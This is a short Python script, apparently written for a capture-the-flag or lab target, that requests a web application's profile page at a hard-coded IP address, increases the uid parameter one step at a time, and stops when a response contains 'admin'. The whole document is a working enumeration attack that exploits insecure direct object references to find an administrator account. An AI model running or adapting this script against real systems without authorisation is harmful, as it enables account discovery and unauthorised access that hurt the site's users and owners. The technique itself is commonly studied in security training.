import requests

url = "http://161.97.155.116:5000/profile?uid={}"
uid = 1

while True:
    #print(uid)
    response = requests.get(url.format(uid))
    if "admin" in response.text:
        print(f"Admin found with uid {uid}")
        break
    uid += 1